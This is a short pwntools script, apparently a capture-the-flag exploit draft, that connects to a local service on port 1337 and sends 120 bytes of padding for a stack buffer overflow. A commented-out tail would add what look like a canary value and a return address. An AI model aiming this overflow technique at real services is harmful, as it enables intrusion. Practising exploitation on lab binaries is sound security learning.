from pwn import *

r = remote('localhost',1337)

output = r.recvuntil('Payload size:')
print(output)
r.sendline(b'120')

payload = b'a' * 120 #+ p64(0xa9d7e9a952699000) + b'a' * 8 + p64(0x5c5591003d1a)

output = r.recvuntil('Send your payload')
print(output)
r.send(payload)

r.interactive()
